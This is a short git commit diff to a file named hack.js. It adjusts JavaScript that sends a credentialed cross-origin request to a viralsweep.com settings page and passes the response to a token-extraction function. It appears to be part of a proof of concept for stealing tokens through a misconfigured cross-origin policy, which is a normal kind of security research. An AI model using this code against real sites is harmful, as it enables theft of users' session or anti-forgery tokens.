351730c35586554069f8fe900e00d064292b9560
hacky4594 <hacky4594@gmail.com>
2017-01-18 23:24:54 +0530

    Update hack.js

--- hack.js
+++ hack.js
@@ -6,9 +6,8 @@ http.open("GET","https://hack.viralsweep.com/settings",true);
 http.setRequestHeader('Content-Type','text/plain');
 http.withCredentials = "true";
 http.onreadystatechange = function(){
-		if(http.responseText!=="")
-			extractToken(http.responseText);
 	if(http.readystate == 4){
+		extractToken(http.responseText);
 	}
 }
 http.send();
